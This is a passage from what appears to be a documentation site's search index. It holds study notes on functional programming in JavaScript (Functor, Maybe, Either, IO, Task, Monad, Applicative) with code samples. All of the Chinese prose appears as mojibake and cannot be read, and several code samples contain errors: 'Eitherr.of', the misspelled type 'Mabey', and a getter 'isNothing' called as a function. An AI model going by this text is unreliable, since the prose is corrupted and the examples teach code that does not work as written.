åŸºäºè¿™ä¸ªé€»è¾‘ï¼Œâ€œç±»å‹â€åœ¨â€œç±»å‹ç³»ç»Ÿâ€ä¸­å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå˜é‡ã€‚TypeScript åŸºäºè¿™ä¸ªé€»è¾‘é€šè¿‡â€œæ³›å‹â€è®¾è®¡äº†ä¸€ä¸ªå›¾çµå®Œå…¨ç³»ç»Ÿã€‚  Parametricityï¼š\n Parametricity æ˜¯ä¸€ç§å‚æ•°å¤šæ€åŒ–å‡½æ•°ï¼Œç»Ÿä¸€éƒ½æ»¡è¶³çš„æŠ½è±¡æ€§è´¨ã€‚å®ƒæŒ‡æ˜äº†æ— è®ºå¤šæ€åŒ–å‚æ•°å®ä¾‹åŒ–ä¸ºé‚£ç§çœŸå®å‡½æ•°ï¼Œè¿™äº›å‡½æ•°éƒ½æœ‰åŒæ ·çš„è¡¨ç°å½¢å¼ï¼› æ¯”å¦‚è¯´æœ‰è¿™æ ·çš„å‡½æ•°ç­¾å [a] =\u0026gt; aï¼Œå› ä¸º a æ˜¯ä»»æ„çš„ç±»å‹ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°åªèƒ½åœ¨æ˜ç¡®çš„ç±»å‹ Array ä¸Šè¿›è¡Œä¸€äº›æ“ä½œï¼ˆæ¯”å¦‚å–å®ƒçš„ç¬¬ä¸€ä¸ªã€æœ€åä¸€ä¸ªã€æˆ–éšæœºçš„ä¸€ä¸ªå…ƒç´ ï¼‰ã€‚  Free Theoremï¼ˆè‡ªç”±å®šç†ï¼Œè§è®ºæ–‡ï¼‰ï¼š\n å› ä¸ºå‚æ•°å¤šæ€åŒ–å‡½æ•°æœ‰ä¸Šé¢çš„ Parametricity æ€§è´¨ï¼Œå¯ä»¥æ¨å¯¼å‡ºå‡½æ•°è®¸å¤šç›¸å…³çš„æ€§è´¨ã€‚ æ¯”å¦‚ä¸‹é¢å°±æ˜¯è‡ªç”±å®šç†æ¨å¯¼å‡ºçš„ä¸€äº›ç»“æœï¼š  compose(f, head) === compose(head, map(f));  compose(map(f), filter(compose(p ,f))) === compose(filter(p), map(f));  è¿™äº›çœ‹èµ·æ¥çº¯ç†è®ºæ¯«æ— ä»·å€¼çš„å…¬å¼ï¼Œå®é™…ä¸Šæ˜¯æœ‰åº”ç”¨ä»·å€¼çš„ã€‚æ¯”å¦‚è¯´ä¸Šé¢çš„ç¬¬ä¸€ä¸ªå…¬å¼ç†è®ºä¸Šè¯æ˜å®ƒä»¬çš„è®¡ç®—ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯åè€…çš„è®¡ç®—é‡å´æ¯”å‰è€…è¦å¤§å¾ˆå¤šã€‚  Constraintsï¼š\n ç±»å‹ç³»ç»Ÿå¯ä»¥å£°æ˜ç±»å‹æ˜ å°„çš„å‚æ•°æ»¡è¶³ä¸€å®šçš„çº¦æŸã€‚è¿™ä¸€ç†è®ºåŒ–çš„å†…å®¹åœ¨ TypeScript ä¸­æ˜¯é€šè¿‡ extends å…³é”®å­—å®ç°çš„ã€‚  "},{"id":71,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/2.container/","title":"2. Container","section":"functional","content":"å®¹å™¨ #  é€šè¿‡ä¸€äº›åŸºç¡€çš„å‡½æ•°å¼ç¼–ç¨‹æ“ä½œï¼Œæˆ‘ä»¬å¾—ä»¥æ›´ä¼˜é›…åœ°è¿›è¡Œç¼–ç¨‹ï¼Œä½†æ˜¯ä¹‹å‰ä½¿ç”¨çš„çº¯å‡½æ•°ç¼–ç¨‹æ–¹æ³•å´å¹¶ä¸èƒ½è§£å†³æ‰€æœ‰çš„é—®é¢˜ã€‚æ¯”å¦‚ï¼šæ§åˆ¶æµã€å¼‚å¸¸å¤„ç†ã€å¼‚æ­¥æ“ä½œã€çŠ¶æ€å˜åŒ–ç­‰ã€‚è¿™äº›é—®é¢˜éƒ½å¯ä»¥ç”¨æœ¬èŠ‚æŠ½è±¡çš„æ¦‚å¿µè§£å†³ã€‚\nContainer #  é€šè¿‡å¦‚ä¸‹æ–¹å¼å®šä¹‰çš„å¯¹è±¡ç§°ä¸ºä¸€ä¸ªç®€å•çš„å®¹å™¨ï¼š\nclass Container {  constructor(x) { this.$value = x; }  static of (x) { return new this.constructor(x); } } å…¶ä¸­ static å‡½æ•° of ä»…ä»…æ˜¯ä¸ºäº†æ–¹ä¾¿ä»£ç æ›´åŠ å‡½æ•°åŒ–è€Œå®šä¹‰ï¼Œä¸å½±å“ç†è®ºæ¢ç©¶çš„å‡½æ•°ã€‚\nå…·ä½“çš„ï¼Œå®¹å™¨çš„æ“ä½œåº”è¯¥éµå¾ªä»¥ä¸‹çš„çº¦å®šï¼š\n Container æ˜¯ä¸€ä¸ªæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå±æ€§çš„å¯¹è±¡ï¼Œæˆ‘ä»¬åé¢å°†æŠ½è±¡åœ°å°†å®ƒå‘½åä¸º $valueï¼› $value ä¸èƒ½è¢«çº¦æŸä¸ºä»»ä½•ç‰¹å®šçš„ç±»å‹ï¼Œå¦åˆ™æˆ‘ä»¬çš„ä½¿ç”¨åœºæ™¯å°†ç›¸å½“æœ‰é™ï¼› $value ä¸€æ—¦è¿›å…¥å®¹å™¨ï¼Œå®ƒå°†ä¸€åªè¢«è®¾ç½®åœ¨å®¹å™¨å†…ã€‚æˆ‘ä»¬å¯ä»¥ä½†ä¸åº”å½“é€šè¿‡ .$value è¿™ç§è®¿é—®å±æ€§çš„æ–¹å¼è®¿é—®ä»–ã€‚  Functor (Identity) #  Functor æ˜¯ä¸€ç±»ç‰¹æ®Šçš„ Containerï¼Œæˆ‘ä»¬åç»­è®¨è®ºçš„å®¹å™¨éƒ½æ˜¯åŸºäº Functor çš„ã€‚å®ƒçš„ç®€å•å®ç°ï¼š\nclass Functor extends Container {  map(f) {  return Functor.of( f(this.$value) );  } } æ‰€ä»¥ Functor æ˜¯ï¼šä¸€ç§å®ç°äº† map æ–¹æ³•çš„å®¹å™¨ã€‚\næœ‰äº† Functorï¼Œæˆ‘ä»¬å°±å¯ä»¥åƒå‡½æ•°å¼ç¼–ç¨‹ä¸€æ ·å¤„ç†æœ‰çŠ¶æ€çš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼š\nFunctor.of(\u0026#39;bombs\u0026#39;).map( append(\u0026#39; away\u0026#39;) ).map( prop(\u0026#39;length\u0026#39;) ); // Functor.$value === 10 Functor åœ¨ Container ä¸­å°±åƒæˆ‘ä»¬ä¹‹å‰åœ¨ compose ä¸­æåˆ°çš„æ’ç­‰å‡½æ•° id ä¸€æ ·å¹³å‡¡ï¼Œæ‰€ä»¥é€šå¸¸ä¹Ÿè¢«ç§°ä¸º Identityã€‚\nMaybe #  ä¸Šé¢çš„å·¥ä½œæ˜¯ç®€å•å¹³å‡¡çš„ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ Container ä¸­å®ç°æ›´å¤šçš„æ–¹æ³•ï¼Œå°±å¯ä»¥æ‹¥æœ‰æ›´ä¸°å¯Œçš„åŠŸèƒ½ã€‚\nMaybe æ˜¯ä¸€ç§ç”¨ Functor å®ç°ç©ºå€¼æ£€æµ‹çš„å®¹å™¨ï¼š\nclass Maybe extends Functor {  get isNothing() {  return this.$value === null || this.$value === undefined;  }   map(fn) {  return this.isNothing ? this : Maybe.of( fn(this.$value) );  }   inspect() {  return this.isNothing ? \u0026#39;Nothing\u0026#39; : `Just(${inspect(this.$value)})`;  } } é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¼ºåˆ¶è¦æ±‚æ¯æ¬¡è°ƒç”¨éƒ½éœ€è¦ä»¥ Maybe ä½œä¸ºè¿”å›å€¼ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬éè¦ç”¨ä¸€ä¸ªé Maybe çš„å‡½æ•°ä½œä¸ºè¿”å›å€¼ï¼Œå¯ä»¥å€ŸåŠ©ä¸‹é¢è¿™ç§æ–¹å¼ï¼š\n// maybe :: b -\u0026gt; (a -\u0026gt; b) -\u0026gt; Maybe a -\u0026gt; b var maybe = curry(function(x, f, m) {  return m.isNothing() ? x : f(m.$value); });  // è¿”å›å€¼æ˜¯ string, è€Œé Maybe var getTwenty = compose(  maybe(\u0026#34;You\u0026#39;re broke!\u0026#34;, finishTransaction), withdraw(20) ); Either #  Either ä¹Ÿæ˜¯ä¸€ç±»ç‰¹æ®Šçš„ Functorï¼Œå®ƒçš„æœ¬æ„æ˜¯æŒ‡è¿”å›å€¼å¯ä»¥æ˜¯ä¸€ä¸ª SumTypeã€‚\nè¿™ç§ Fucntor å¯ä»¥è¢«ç”¨äºè¿›è¡Œé”™è¯¯å¤„ç†ï¼Œä¸åŒäº throw/catchï¼Œä½¿ç”¨è¿™ç§æ–¹å¼è¿›è¡Œé”™è¯¯å¤„ç†æ›´åŠ æ¸©å’Œï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªå·¦å€¼ä½œä¸ºå‘ç”Ÿå¼‚å¸¸æ—¶çš„ç±»å‹ï¼ˆæ¯”å¦‚ä¸€ä¸ªæ‰¿è½½é”™è¯¯ä¿¡æ¯çš„å­—ç¬¦ä¸²ï¼Œç±»å‹ä¸º Stringï¼‰ï¼Œå³å€¼ä½œä¸ºæ‰§è¡ŒæˆåŠŸæ—¶çš„çœŸæ­£ç»“æœã€‚\nclass Either extends Functor {  static of(x) {  return new Right(x);  } }  class Left extends Either {  map(fn) { return this; } }  class Right extends Either {  map(fn) {  try {  return Eitherr.of( fn(this.$value) );  } catch (e) {  return new Left(e);  }  } } IO #  åœ¨åŸºç¡€éƒ¨åˆ†æåˆ°è¿›è¡Œå‡½æ•°ç¼–ç¨‹çš„å‰ææ˜¯éœ€è¦çº¯å‡½æ•°ï¼Œä½†æ˜¯æŸäº›å‡½æ•°çš„æ‰§è¡Œç»“æœç”±äºä¾èµ–äºå¤–éƒ¨çš„ç¯å¢ƒï¼Œæ‰€ä»¥ç›¸åŒçš„è¾“å…¥é€šå¸¸ä¼šå¾—åˆ°ä¸åŒçš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¸ªå‡½æ•°åŸå­åŒ–å¹¶ä»¥å…¶æœ¬èº«ä½œä¸ºè¿”å›å€¼ï¼Œæ„é€ ä¸€ä¸ªäºŒçº§å‡½æ•°ï¼Œè¿™ä¸ªäºŒçº§å‡½æ•°æ˜¾ç„¶æ˜¯ä¸€ä¸ªçº¯å‡½æ•°ã€‚\nä»¥è¿™ä¸ªæ€æƒ³æ„é€ çš„å®¹å™¨ç§°ä¸º IOï¼Œå³ $value ä¸ºå‡½æ•°çš„ Functorï¼š\nclass IO extends Functor {  static of(x) {  return new IO(() =\u0026gt; x);  }   constructor(fn) {  this.$value = fn;  }   map(fn) {  return new IO(compose(fn, this.$value));  }   inspect() {  return `IO(${inspect(this.$value)})`;  } } åœ¨ç³»åˆ—å‡½æ•°æ‰§è¡Œä¹‹åï¼Œå‡½æ•°çš„ $value æœ¬è´¨æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨æœ€åæ‰§è¡Œå®ƒã€‚ä½†æ˜¯è¿™ä¸€ç›´æ¥è®¿é—® $value çš„æ“ä½œåœ¨æˆ‘ä»¬çš„å®¹å™¨è®¾è®¡ä¸­æ€»æ˜¯ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡å‘½åä¸º unsafePerformIO ä»¥æŒ‡ç¤ºè¿™ä¸€åŒºåˆ«ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåº”ç”¨ IO çš„ä¾‹å­ï¼š\nconst url = new IO(() =\u0026gt; window.location.href);  const toPairs: string =\u0026gt; string[][] = compose(map(split(\u0026#39;=\u0026#39;)), split(\u0026#39;\u0026amp;\u0026#39;)); const params: string =\u0026gt; string[][] = compose(toPairs, last, split(\u0026#39;?\u0026#39;)); const findParam: string =\u0026gt; IO\u0026lt;Maybe\u0026lt;string[]\u0026gt;\u0026gt; = key =\u0026gt; url.map( compose(Maybe.of, find(compose(eq(key), head)), params) );  // impure code findParam(\u0026#39;searchTerm\u0026#39;).unsafePerformIO(); PostScriptï¼š\n map å‡½æ•°çš„ç†è§£ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ˜ å°„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å®šä¹‰åŸŸï¼Œè¿”å›å€¼åˆ™æ˜¯å€¼åŸŸã€‚ è™½ç„¶æˆ‘ä»¬ç°åœ¨å®šä¹‰çš„è¿™äº›å‡½æ•°éƒ½æ˜¯æˆå‘˜å‡½æ•°ï¼Œä½†æ˜¯ä¹‹åå®ƒä»¬å¯èƒ½ä¼šç»å¸¸ä»¥ç‹¬ç«‹å‡½æ•°çš„èº«ä»½å‡ºç°ï¼Œå®ƒä»¬é€šå¸¸è¢«å®šä¹‰ä¸ºâ€œæ¥å—ä¸€ä¸ªå¯¹åº” Functor ç±»å‹å¹¶ä¸”æ‰§è¡Œå¯¹åº”æˆå‘˜å‡½æ•°â€çš„å‡½æ•°ï¼Œç”±äºè¿™ä¸ªè§„å®šæ˜¯ä¸ºäº†ä¼˜åŒ– compose å‡½æ•°çš„ç¼–å†™ï¼Œå› æ­¤å®¹å™¨ç±»å‹çš„å‚æ•°é€šå¸¸æ˜¯æœ€åä¸€ä¸ªå‚æ•°ã€‚æ¯”å¦‚ï¼šmap = curry( (fn, m) =\u0026gt; m.map(fn) );  Task #  æœ€åå¼‚æ­¥ç±»å‹çš„ä»»åŠ¡å¯ä»¥ç”¨ä¸€ä¸ªå« Task çš„å®¹å™¨å¤„ç†ï¼Œè¿™ä¸ªå®¹å™¨çš„å…·ä½“å®ç°è¿‡ç¨‹è¿‡äºå¤æ‚ï¼Œä¸‹é¢ä»…ä»…åˆ—ä¸¾å®ƒçš„ä¸€ä¸ªä½¿ç”¨çš„ä¾‹å­ï¼š\nvar getJSON: string =\u0026gt; object =\u0026gt; Task\u0026lt;Error, object\u0026gt; = curry(  (url, params) =\u0026gt; new Task((reject, result) =\u0026gt; {  $.getJSON(url, params, result).fail(reject); \t}) );  var blogPage: object =\u0026gt; HTML = Handlebars.compile(blogTemplate); var renderPage: object =\u0026gt; HTML = compose(blogPage, sortBy(\u0026#39;date\u0026#39;)); var blog: object =\u0026gt; Task\u0026lt;Error, object\u0026gt; = compose(map(renderPage), getJSON(\u0026#39;/posts\u0026#39;)); å®é™…å‡½æ•°åœ¨æ‰§è¡Œæ—¶ï¼Œåˆ™éœ€è¦è°ƒç”¨ fork å‡½æ•°è¿›è¡Œå¼‚æ­¥åœ°æ‰§è¡Œï¼š\nblog({}).fork(  error =\u0026gt; $(\u0026#39;#error\u0026#39;).html(error.message),  page =\u0026gt; $(\u0026#39;#main\u0026#39;).html(page), ); èŒƒç•´å­¦ç†è®º #  ä¸Šé¢æåˆ°çš„è¿™äº› Container éƒ½è¢«ç§°ä¸º Functorï¼Œè€Œ Functor æœ¬èº«æ˜¯å¯ä»¥æ„æˆä¸€ä¸ªèŒƒç•´å­¦æ„ä¹‰ä¸Šçš„ category çš„ï¼š\n æ’ç­‰æ˜ å°„ï¼šmap(id) === idï¼› ç»„åˆå¾‹ï¼šcompose(map(f), map(g)) === map(compose(f, g))ï¼›  "},{"id":72,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/3.monad/","title":"3. Monad","section":"functional","content":"Monad #  Pointy Functor Factory #  åœ¨å‰é¢æœ‰å…³ Functor çš„è®ºè¿°ä¸­ä½¿ç”¨äº† of å‡½æ•°ï¼Œå®é™…ä¸Šè¿™ä¸ªå‡½æ•°å¹¶ä¸æ˜¯ç”¨æ¥æ›¿æ¢ new è¿™ä¸ªæ“ä½œç¬¦çš„ï¼š\n Pointed Functorï¼šä¸€ç§å®ç°äº† of æ–¹æ³•çš„ Functorã€‚  of æ–¹æ³•åœ¨å¾ˆå¤šåœ°æ–¹ä»¥ä¸åŒçš„åç§°å‡ºç°ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æ˜¯ç›¸åŒçš„æ„æ€ï¼Œæ¯”å¦‚ pure, point, unit æˆ– returnã€‚\nJavaScript è¯­è¨€ä¸­æœ‰è®¸å¤šç±»å‹åŠŸèƒ½çš„åº“ï¼šfolktaleã€ramda æˆ– fantasy-landã€‚\nWhat\u0026rsquo;s Monad? #  å…ˆçœ‹ä¸€ä¸ªé€šè¿‡ Container æ–¹æ³•ä» Json ä¸­è·å–ç»™å®šå­—æ®µçš„ä¾‹å­ï¼š\nconst safeProp: string =\u0026gt; object =\u0026gt; Mabey\u0026lt;any\u0026gt; = curry((x, obj) =\u0026gt; Maybe.of(obj[x])); const safeHead: object =\u0026gt; Maybe\u0026lt;any\u0026gt; = safeProp(0);  const firstAddressStreet: object =\u0026gt; Maybe\u0026lt;Maybe\u0026lt;Maybe\u0026lt;any\u0026gt;\u0026gt;\u0026gt; = compose(  map(map(safeProp(\u0026#39;street\u0026#39;))),  map(safeHead),  safeProp(\u0026#39;addresses\u0026#39;), );  firstAddressStreet({  addresses: [{ street: { name: \u0026#39;Mulburry\u0026#39;, number: 8402 }, postcode: \u0026#39;WC2N\u0026#39; }], }); å¯ä»¥çœ‹åˆ°åœ¨å¤„ç†çœŸå®åœºæ™¯æ—¶ï¼Œmap ä¼šåƒä¸Šé¢çš„æƒ…å†µä¸€æ ·å‡ºç°å¤šå±‚åµŒå¥—çš„æƒ…å†µã€‚æˆ‘ä»¬å¯ä»¥ç”¨ join å‡½æ•°è§£å†³ä¸Šé¢çš„é—®é¢˜ï¼š\n join æ˜¯ç”¨äºç¼©å‡ç›¸åŒç±»å‹è¿”å›å€¼å‡ºç°åµŒå¥—æƒ…å†µçš„å‡½æ•°ã€‚å®ç°äº† join æ–¹æ³•çš„ pointed functor è¢«ç§°ä¸º monadï¼›  ä»¥ä¸‹æ˜¯ Maybe å®ç° join æ–¹æ³•çš„ä¾‹å­ï¼š\nMaybe.prototype.join = function join() {  return this.isNothing() ? Maybe.of(null) : this.$value; }; æˆ‘ä»¬å¯ä»¥ç”¨ join ä¼˜åŒ–ä¸Šé¢çš„ä¾‹å­ï¼š\nconst firstAddressStreet = compose(  join,\t// Maybe\u0026lt; Maybe\u0026lt;object\u0026gt; \u0026gt; =\u0026gt; Maybe\u0026lt;object\u0026gt;  map(safeProp(\u0026#39;street\u0026#39;)),// Maybe\u0026lt;object\u0026gt; =\u0026gt; Maybe\u0026lt; Maybe\u0026lt;object\u0026gt; \u0026gt;  join,\t// Maybe\u0026lt; Maybe\u0026lt;object\u0026gt; \u0026gt; =\u0026gt; Maybe\u0026lt;object\u0026gt;  map(safeHead),\t// Maybe\u0026lt;object\u0026gt; =\u0026gt; Maybe\u0026lt; Maybe\u0026lt;object\u0026gt; \u0026gt;  safeProp(\u0026#39;addresses\u0026#39;), // object =\u0026gt; Maybe\u0026lt;object\u0026gt; );  firstAddressStreet({  addresses: [{ street: { name: \u0026#39;Mulburry\u0026#39;, number: 8402 }, postcode: \u0026#39;WC2N\u0026#39; }], }); chain #  åœ¨ä¸Šé¢å¼•å…¥ join å¯¹åŸæ¥çš„ç¨‹åºè¿›è¡Œäº†ä¼˜åŒ–ä¹‹åï¼Œè™½ç„¶è§£å†³äº†åµŒå¥—è°ƒç”¨å’Œè¿”å›å¤šå±‚ Functor çš„é—®é¢˜ï¼Œä½†æ˜¯è°ƒç”¨é“¾å´ä¼¼ä¹æ›´é•¿äº†ã€‚\næˆ‘ä»¬å‘ç° join å‡½æ•°ä¸ map å‡½æ•°æ€»æ˜¯è¿ç»­åœ°å‡ºç°ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªæŠ½è±¡æˆä¸€ä¸ªæ–°çš„å‡½æ•° chainï¼ˆæˆ–è€…åœ¨æŸäº›è¯­å¢ƒä¸‹çš„å…¶ä»–åç§°ï¼Œä½†æ˜¯å®ƒä»¬éƒ½è¡¨ç¤ºç›¸åŒçš„æ„æ€ï¼Œæ¯”å¦‚ \u0026gt;\u0026gt;=ã€flatMapï¼‰ï¼š\nconst chain = curry((f, m) =\u0026gt; m.map(f).join()); // or const chain = function \u0026lt;Farg, Fret\u0026gt;(f: Farg =\u0026gt; Monad\u0026lt;Fret\u0026gt;): (Monad\u0026lt;Farg\u0026gt; =\u0026gt; Monad\u0026lt;Fret\u0026gt;) {  return compose(join, map(f)); } åŒæ ·çš„æˆ‘ä»¬å¯ä»¥ç”¨ chain æ¥ä¼˜åŒ–ä¸Šé¢çš„ä¾‹å­ï¼š\nconst firstAddressStreet = compose(  chain(safeProp(\u0026#39;street\u0026#39;)),// Maybe\u0026lt;object\u0026gt; =\u0026gt; Maybe\u0026lt;object\u0026gt;  chain(safeHead),\t// Maybe\u0026lt;object\u0026gt; =\u0026gt; Maybe\u0026lt;object\u0026gt;  safeProp(\u0026#39;addresses\u0026#39;),\t// object =\u0026gt; Maybe\u0026lt;object\u0026gt; ); æœ‰äº†å¼ºå¤§çš„ chainï¼Œæˆ‘ä»¬ï¼š\n å¯ä»¥å¹¶ä¸å¢åŠ æˆæœ¬åœ°åƒç”¨ map å¤„ç†çº¯å‡½æ•°é‚£æ ·ï¼Œç”¨ chain å¤„ç†æœ‰å‰¯ä½œç”¨çš„å‡½æ•°ï¼› ç”šè‡³å¯ä»¥æŠŠ join å®šä¹‰ä¸º chain(id)ï¼Œæ‰€æœ‰è¿™äº›æ¦‚å¿µçš„å®šä¹‰éƒ½æ˜¯ç›¸äº’è”ç³»çš„ï¼ˆJs ä¸­æœ‰å…³è¿™äº›æ¦‚å¿µçš„æ¨å¯¼éƒ½åˆ—åœ¨äº† fantacyland ä¸­ï¼‰ï¼›  ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨ chain å¤„ç†å‰¯ä½œç”¨å‡½æ•°çš„ä¾‹å­ï¼š\nquerySelector(\u0026#39;input.username\u0026#39;).chain(  ({ value: uname }) =\u0026gt; querySelector(\u0026#39;input.email\u0026#39;).map(  ({ value: email }) =\u0026gt; `Welcome ${uname}prepare for spam at ${email}`  ) ); Power Trip #  æœ‰äº†ä¸Šé¢å®šä¹‰çš„è¿™äº›æ–¹æ³•æˆ‘ä»¬å°±å¯ä»¥ä¼˜åŒ–åˆ†æ”¯æå¤šçš„é”™è¯¯å¤„ç†å‡½æ•°äº†ã€‚æ¯”å¦‚æœ€å¸¸è§çš„è¯»å–æ–‡ä»¶åå‘é€ç½‘ç»œè¯·æ±‚ï¼š\n// upload :: Filename -\u0026gt; (String -\u0026gt; a) -\u0026gt; Void const upload = (filename, callback) =\u0026gt; {  if (!filename) {  throw new Error(\u0026#39;You need a filename!\u0026#39;);  } else {  readFile(filename, (errF, contents) =\u0026gt; {  if (errF) throw errF;  httpPost(\u0026#39;/uploads\u0026#39;, contents, (errH, json) =\u0026gt; {  if (errH) throw errH;  callback(json);  });  });  } }; å¯ä»¥ç”¨ä¸‹é¢çš„ä¸€è¡Œå‡½æ•°ä¼˜åŒ–ï¼š\nconst upload = compose(map(chain(httpPost(\u0026#39;/uploads\u0026#39;))), readFile); èŒƒç•´å­¦ç†è®º #  ç”± Monad æ„æˆçš„è¿ç®—è§„åˆ™ä¹Ÿå¯ä»¥è¢«å®šä¹‰ä¸º categoryï¼š\n é›†åˆåŸºæœ¬å…ƒç´ ä¸ºç­¾åä¸º T =\u0026gt; Monad\u0026lt;T\u0026gt; çš„æ‰€æœ‰æ˜ å°„ ã€‚æ€å°„å³æ‰€æœ‰åŸºæœ¬å…ƒç´ å†…çš„æ˜ å°„ è€ƒè™‘ chainï¼Œå®šä¹‰äºŒå…ƒè¿ç®—ï¼šmcompose = (f, g) =\u0026gt; compose(chain(f), g)  å•ä½å…ƒï¼šid = (monad) =\u0026gt; Monad.of(monad)ï¼› ç»„åˆå¾‹ï¼šmcompose(mcompose(f, g), h) === mcompose(f, mcompose(g, h))ï¼›    ä¸Šé¢è¿™ä¸ª category åœ¨èŒƒç•´è®ºé‡Œæ¥æºäºä¸€ä¸ªç‰¹æ®Šçš„èŒƒç•´ \u0026ldquo;Kleisli category\u0026rdquo;ï¼›\n"},{"id":73,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/4.applicative/","title":"4. Applicative","section":"functional","content":"Applicative #  Brief Introduction #  Applicative æŒ‡çš„æ˜¯è¿™æ ·çš„ä¸€ä¸ªæ€§è´¨ï¼šfunctor ä¹‹é—´å¯ä»¥ç›¸äº’ applyã€‚\nçœ‹ä¸‹é¢è¿™æ ·ä¸€ä¸ªä¾‹å­ï¼š\nContainer.of(2).chain(two =\u0026gt; Container.of(3).map(add(two))); ä¸Šé¢æ˜¯ä¸€ä¸ªç”¨ Monad å®ç° 2+3 çš„ä¾‹å­ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬éœ€è¦æ„é€  Container.of(3) ç„¶åæ„é€ ä¸€ä¸ªåŠ æ³•å‡½æ•°ï¼Œæœ€åæ„é€ ä¸€ä¸ª Container.of(2) è¿›è¡Œåº”ç”¨ã€‚\næˆ‘ä»¬å‘ç° Container.of(3)/Container.of(2) å…·æœ‰å…ˆåçš„æ„é€ å…³ç³»ï¼Œè¿™æ˜¯æ²¡æœ‰å¿…è¦çš„ï¼Œå¦‚æœæˆ‘ä»¬èƒ½åŒæ—¶æ„é€ ä¸¤ä¸ª Functor å¹¶ä¸”å…¶ä¸­ä¸€ä¸ªåº”ç”¨åˆ°å¦ä¸€ä¸ªä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å®Œç¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªæ€§è´¨å°±å«åš Applicativeã€‚\nap #  åœ¨ applicative è¿™ä¸ªæ¦‚å¿µé‡Œçš„æ ¸å¿ƒå‡½æ•°æ˜¯ apã€‚å®ƒçš„å®ç°å¦‚ä¸‹ï¼š\n// ç±»å‹ç­¾å type apSig\u0026lt;Farg, Fret\u0026gt; = (Container\u0026lt;Farg\u0026gt;, Container\u0026lt;Farg =\u0026gt; Fret\u0026gt;) =\u0026gt; Container\u0026lt;Fret\u0026gt;; // å‡½æ•°å®ç° Container.prototype.ap = function (otherContainer) {  return otherContainer.map(this.$value); } ap å‡½æ•°çš„å®ç°å³ Applicative Functor çš„å®šä¹‰ï¼š\n å®ç°äº† ap å‡½æ•°çš„ Pointed Functor å³ä¸º Applicative Functorï¼›  å¯ä»¥ç”¨ ap ä¼˜åŒ–ä¸Šé¢çš„ä¾‹å­ï¼š\nContainer.of(3).map(add(2)) // optimize to =\u0026gt; Container.of(add(2)).ap(Container.of(3));  Container.of(2).chain(two =\u0026gt; Container.of(3).map(add(two))); // map(compose(f, g)) === compose(map(f), map(g)) //\tcompose(map(f), of) === compose(of, f) // optimize to =\u0026gt; Container.of(2).map(add).ap(Container.of(3)); ä¸Šé¢çš„ä¼˜åŒ–ä½¿ç”¨äº† ap çš„ä¸€ä¸ªæ’ç­‰æ€§è´¨ï¼š\nF.of(x).map(f) === F.of(f).ap(F.of(x)) åˆ©ç”¨è¿™ä¸ªæ€§è´¨æˆ‘ä»¬ç”šè‡³å¯ä»¥æŠŠä»£ç å†™æˆæ›´å®¹æ˜“è¯»æ‡‚çš„ä»å·¦åˆ°å³çš„å†™æ³•ï¼š\nContainer.of(add).ap(Maybe.of(2)).ap(Maybe.of(3)); å°†è¿™ä¸ªç†å¿µåº”ç”¨åˆ° Task ä¸Šï¼Œå¯ä»¥åŒæ­¥åœ°æ‰§è¡Œä¸¤ä¸ªä¸åŒçš„å¼‚æ­¥ä»»åŠ¡ï¼š\nTask.of(renderPage).ap(Http.get(\u0026#39;/destinations\u0026#39;)).ap(Http.get(\u0026#39;/events\u0026#39;)); lift #  ä¸Šé¢æåˆ° ap è¿™ä¸ªå‡½æ•°å¯ä»¥åœ¨å‡½æ•°å¼ç¼–ç¨‹ä¸­å®ç°ä¸å¸¸è§„å‡½æ•°ä¸€æ ·çš„ä»å·¦å‘å³çš„ä¾æ¬¡è°ƒç”¨è¿‡ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥åƒå¸¸è§„å¤šå‚æ•°å‡½æ•°ä¸€æ ·ä¼ é€’å‚æ•°å‘¢ã€‚\nè¿™ä¸ªç†å¿µå¯ä»¥ç”¨ lift è¿™ä¸ªå‡½æ•°å®ç°ï¼š\nconst liftA3 = curry((g, f1, f2, f3) =\u0026gt; f1.map(g).ap(f2).ap(f3)); Category Thory #  æœ¬èŠ‚ä¸­æåŠçš„ ap å¯ä»¥æ„æˆèŒƒç•´è®ºä¸­çš„ categoryï¼š\n å®šä¹‰äºŒå…ƒè¿ç®—ï¼šb = (l, r) =\u0026gt; l.ap(r)ï¼›  å•ä½å…ƒ id = Functor.of(x =\u0026gt; x)ï¼Œb(id, any) === any    "},{"id":74,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/html5/html-css%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"HTML Cssè‡ªå­¦ç¬”è®°","section":"html5","content":"è‡ªå­¦ç¬”è®° (pdf) #  